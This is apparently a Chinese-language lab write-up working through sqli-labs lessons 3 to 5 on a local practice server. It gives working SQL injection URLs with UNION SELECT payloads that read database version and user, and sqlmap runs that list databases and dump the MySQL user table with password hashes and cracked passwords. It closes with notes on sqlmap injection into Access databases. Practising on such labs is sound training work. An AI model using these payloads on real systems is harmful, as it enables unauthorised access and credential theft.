###less3

```
http://192.168.48.128/sqli-labs/Less-3/?id=1'
```
报错:
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
```

报错 near ''1'') 有个右括号,加个)闭合左括号:
so猜测注入语法是:

```
http://192.168.48.128/sqli-labs/Less-3/?id=1') %23
```

接下来和less1,less2一样 通过order by 和 union lelect判断字段数:
```
http://192.168.48.128/sqli-labs/Less-3/?id=1') and 1=2 union select null,null,null  %23
```
结果是:

```
Your Login name:2
Your Password:3
```
查看数据库信息:
```
http://192.168.48.128/sqli-labs/Less-3/?id=1') and 1=2 union select 1,2, concat_ws(char(32,58,32),@@version,@@datadir,user(),database())  %23

Your Password:5.5.53 : C:\phpStudy\MySQL\data\ : root@localhost : security 
```

###less4
```
http://192.168.48.128/sqli-labs/Less-4/?id=1'
```
单引号不报错,加双引号尝试:
```
http://192.168.48.128/sqli-labs/Less-4/?id=1'"

报错:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1'"") LIMIT 0,1' at line 1
```
由此判断和less3不同的是单引号变成了双引号。注入语句:
```
http://192.168.48.128/sqli-labs/Less-4/?id=1")%20%23

```
获取数据库信息:
```
http://192.168.48.128/sqli-labs/Less-4/?id=1") and 0 union select null,null, concat_ws(char(32,58,32),@@version,@@datadir,user(),database())  %23 
```

### less5
```bash

root@kali:~# sqlmap -u http://192.168.48.128/sqli-labs/Less-5/?id=1  --dbs
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.1.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 23:54:30

[23:54:30] [INFO] resuming back-end DBMS 'mysql' 
[23:54:30] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 3974=3974 AND 'Xwkf'='Xwkf

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 6791 FROM(SELECT COUNT(*),CONCAT(0x71767a7871,(SELECT (ELT(6791=6791,1))),0x716b716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'KEQk'='KEQk

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1' AND SLEEP(5) AND 'eSQE'='eSQE
---
[23:54:30] [INFO] the back-end DBMS is MySQL
web server operating system: Windows
web application technology: PHP 5.4.45, Apache 2.4.23
back-end DBMS: MySQL >= 5.0
[23:54:30] [INFO] fetching database names
[23:54:30] [INFO] the SQL query used returns 8 entries
[23:54:30] [INFO] resumed: information_schema
[23:54:30] [INFO] resumed: challenges
[23:54:30] [INFO] resumed: dede
[23:54:30] [INFO] resumed: mysql
[23:54:30] [INFO] resumed: performance_schema
[23:54:30] [INFO] resumed: security
[23:54:30] [INFO] resumed: test
[23:54:30] [INFO] resumed: wordpress
available databases [8]:
[*] challenges
[*] dede
[*] information_schema
[*] mysql
[*] performance_schema
[*] security
[*] test
[*] wordpress

[23:54:30] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.48.128'

[*] shutting down at 23:54:30
```


```bash
root@kali:~# sqlmap -u http://192.168.48.128/sqli-labs/Less-5/?id=1  -D mysql -T user --dump -C user,host,password
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.1.4#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 00:03:44

[00:03:44] [INFO] resuming back-end DBMS 'mysql' 
[00:03:44] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 3974=3974 AND 'Xwkf'='Xwkf

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 6791 FROM(SELECT COUNT(*),CONCAT(0x71767a7871,(SELECT (ELT(6791=6791,1))),0x716b716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'KEQk'='KEQk

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1' AND SLEEP(5) AND 'eSQE'='eSQE
---
***省略n行***
Database: mysql
Table: user
[4 entries]
+-----------+-----------+----------------------------------------------------+
| user      | host      | password                                           |
+-----------+-----------+----------------------------------------------------+
| dede      | %         | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 (123456) |
| root      | %         | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 (123456) |
| wordpress | %         | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 (123456) |
| root      | localhost | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 (123456) |
+-----------+-----------+----------------------------------------------------+

[00:03:46] [INFO] table 'mysql.`user`' dumped to CSV file '/root/.sqlmap/output/192.168.48.128/dump/mysql/user.csv'
[00:03:46] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.48.128'

[*] shutting down at 00:03:46


```


###SQLmap注入access数据库:

- [使用sqlmap工具进行Acces注入](http://www.cnblogs.com/xingyunblog/p/4115707.html)
- [sqlmap之(三)----Access注入实战 ](http://blog.csdn.net/u011781521/article/details/58073135)
- [sqlmap用户手册-wooyun](http://static.hx99.net/static/drops/tips-143.html)


```
暴力破解表名
参数：--common-tables

当使用--tables无法获取到数据库的表时，可以使用此参数。

通常是如下情况：

1、MySQL数据库版本小于5.0，没有information_schema表。
2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。
3、当前用户没有权限读取系统中保存数据结构的表的权限。
```